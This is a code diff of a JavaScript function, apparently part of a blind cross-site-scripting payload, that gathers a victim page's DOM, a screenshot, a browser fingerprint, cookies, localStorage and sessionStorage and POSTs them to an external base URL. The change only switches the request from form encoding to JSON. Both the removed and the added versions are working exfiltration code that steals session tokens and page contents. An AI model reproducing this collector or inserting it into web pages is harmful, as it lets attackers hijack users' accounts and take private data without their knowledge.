@@ -8538,20 +8538,27 @@ async function sendData(baseURL, otherData) {
     var screenshotReturn = await html2canvas(document.querySelector('html'))
     var fingerprintReturn = await Fingerprint2.getPromise()
 
-    screenshot = encodeURIComponent(screenshotReturn.toDataURL())
-    fingerprint = encodeURIComponent(JSON.stringify(fingerprintReturn))
-    cookies = encodeURIComponent(document.cookie)
-    localStorageEncoded = encodeURIComponent(JSON.stringify(localStorage))
-    sessionStorageEncoded = encodeURIComponent(JSON.stringify(sessionStorage))
-    callerURL = encodeURIComponent(location.href)
-    dom = encodeURIComponent(document.documentElement.innerHTML)
+    otherDataList = otherData.split("&")
+    otherDataDict = {}
+    for (const element of otherDataList){
+        element_splitted = element.split("=")
+        otherDataDict[element_splitted[0]] = element_splitted[1]
+    }
 
-    postData = `dom=${dom}&screenshot=${screenshot}&fingerprint=${fingerprint}&cookies=${cookies}&local_storage=${localStorageEncoded}&session_storage=${sessionStorageEncoded}&origin_url=${callerURL}&${otherData}`
+    postData = Object.assign({
+        dom: document.documentElement.innerHTML,
+        screenshot: screenshotReturn.toDataURL(),
+        fingerprint: JSON.stringify(fingerprintReturn),
+        cookies: document.cookie,
+        local_storage: JSON.stringify(localStorage),
+        session_storage: JSON.stringify(sessionStorage),
+        origin_url: location.href
+    }, otherDataDict)
 
     request = new XMLHttpRequest()
 
     request.open('POST', baseURL, true)
-    request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
-    request.send(postData)
+    request.setRequestHeader('Content-type', 'application/json;charset=UTF-8')
+    request.send(JSON.stringify(postData))
 
 }
